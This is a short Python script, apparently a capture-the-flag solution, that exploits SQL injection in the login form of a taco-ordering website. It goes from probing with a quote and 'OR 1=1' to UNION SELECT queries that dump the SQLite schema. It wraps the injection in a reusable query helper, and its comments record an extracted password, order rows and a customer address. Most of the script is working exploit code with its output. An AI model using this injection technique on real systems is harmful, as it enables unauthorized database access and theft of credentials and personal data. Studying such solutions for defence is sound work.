import requests
import re

s = requests.session()

uid = '34f1c04b2a6d8eb621120829ee0d2e47'
params = {'uid': uid}

#r1 = s.get('https://tacos.cityinthe.cloud/', params=params)
'''
r1 = s.post('https://tacos.cityinthe.cloud/', params=params, data={
    'Name': '"',
    'Password': '',
    })

r2 = s.post('https://tacos.cityinthe.cloud/', params=params, data={
    'Name': '" OR 1=1 -- ',
    'Password': '',
    })

r3 = s.post('https://tacos.cityinthe.cloud/', params=params, data={
    'Name': '" union select 1 --',
    'Password': '',
    })

r4 = s.post('https://tacos.cityinthe.cloud/', params=params, data={
    'Name': '" union select sql from sqlite_master --',
    'Password': '',
    })
'''
">Welcome, CREATE TABLE orders (id TEXT, address TEXT, placed TEXT, total INTEGER, notes TEXT)CREATE TABLE users (name TEXT, username TEXT, password TEXT)"

def query(querystring):
    r5 = s.post('https://tacos.cityinthe.cloud/', params=params, data={
        'Name': '" union %s --' % (querystring,),
        'Password': '',
        })
    
    #print(r5.text)
    data = re.findall('Welcome, (.*?)</h2>', r5.text)[0]
    print(data)
    return data

#query('select password from users where name = "Tacomaster Paco"')
# 'mastertaco'
#query('select count(*) from orders')
# 24

'''
last_id = 0
results = []
for i in range(24):
    row = query('select id || ", " || address || ", " || placed || ", " || total || ", " || notes from orders where id > %d' % (last_id,)).split(', ')
    last_id = max(last_id, int(row[0], 10))
    results.append(row)
'''
    
'''
>>> 'Z2l2ZSB0aGUgZmxhc2hkcml2ZSB0byAtZmxhbWV6LQ=='.decode('base64')
'give the flashdrive to -flamez-'
'''

# query('select address from orders where notes like "%Z2l2ZSB0aGUgZmxhc2hkcml2ZSB0byAtZmxhbWV6LQ==%"')
# 4819 Maplegrove Street, Mainsfield MA
